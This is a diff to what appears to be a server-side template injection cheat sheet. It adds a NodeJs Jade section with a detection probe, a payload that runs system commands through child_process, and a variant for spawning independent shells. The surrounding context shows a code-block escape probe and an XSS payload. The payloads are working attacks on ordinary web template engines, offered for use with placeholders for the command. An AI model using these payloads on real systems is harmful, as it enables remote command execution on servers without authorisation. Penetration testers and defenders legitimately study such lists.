@@ -12,7 +12,7 @@ If the user input is included inside a code block follow these steps
 2. Try to escape from the code block by submitting a payload as follow (adjust based on the engine's syntax): `}}<b>test</b>`
 3. If the content of the code block is rendered correctly alongside the injected tags then the application is vulnerable to SSTI
 
-## Engine identification
+## Server Side
 
 ### ASP
 
@@ -225,6 +225,31 @@ Newer versions
 
 ```
 {{:%22a%22.toString.constructor.call({},%22<XSS payload>%22)()}}
+```
+
+### NodeJs - Jade
+
+#### Identification
+
+```
+#{{7*7}}
+```
+
+#### Command execution
+
+```
+#{root.process.mainModule.require('child_process').spawnSync('<cmd>', ['<arg>']).stdout}
+```
+
+#### Command execution as subprocess
+
+Useful for spawning independent shells
+
+```
+var x = root.process
+x = x.mainModule.require
+x = x('child_process')
+x.exec('<cmd>')
 ```
 
 ### NodeJs - PugJs
